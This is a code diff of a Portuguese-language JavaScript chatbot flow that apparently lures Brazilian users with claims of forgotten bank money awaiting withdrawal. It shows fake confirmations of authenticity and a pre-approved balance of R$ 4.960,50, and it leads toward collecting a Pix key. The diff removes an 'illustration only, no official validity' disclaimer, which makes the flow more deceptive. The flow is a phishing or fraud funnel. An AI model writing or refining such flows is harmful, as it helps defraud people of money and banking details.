@@ -386,7 +386,7 @@ const flow = {
     messages: [
       "Olá, Seja Bem-vindo!",
       "Nos próximos passos vou te auxiliar a resgatar seus valores a receber.",
-      "Nos últimos dias, milhares de brasileiros conseguiram sacar esses valores esquecidos em contas bancarias, responda às perguntas a seguir para aprovação."
+      "Nos últimos dias, milhares de brasileiros conseguiram sacar esses valores esquecidos em contas bancarias, responda às perguntas a seguir para aprovação.",
     ],
     choices: [
       { label: "Continuar", next: "bloco2" }
@@ -426,21 +426,19 @@ const flow = {
 
   bloco5: {
     messages: [
-      "Nossos valores liberados podem variar entre R$ 10,00 ou R$ 25.000,00 dentro deste programa! ",
+      "Nossos valores liberados podem variar entre R$ 10,00 ou R$ 25.000,00 dentro deste programa!",
       "Milhares de Brasileiros conseguiram e agora você pode se encaixar!"
     ],
-    imagePlaceholder: "ILUSTRAÇÃO DE DEMONSTRAÇÃO — SEM VALIDADE OFICIAL",
+    imagePlaceholder: "Verificar meus valores agora mesmo",
     choices: [
-      { label: "Verificar meus valores agora mesmo", next: "bloco6" }
+      { label: "Verificar", next: "bloco6" }
     ],
   },
 
   bloco6: {
     messages: [
       "Autenticidade confirmada!",
-      "Saldo Disponível Para Receber: R$ 4.960,50 
-      "Status: Pré-aprovado"  
-      "Obs: Solicite este saque agora mesmo! Caso ao contrario o Governo Do Brasil arrecada saques pendentes para fundos."
+      "Saldo Disponível Para Receber: R$ 4.960,50"
     ],
     card: {
       title: "Acabamos de salvar e verificar suas informações com sucesso! Iremos iniciar a etapa da sua Indenização e chave Pix.",
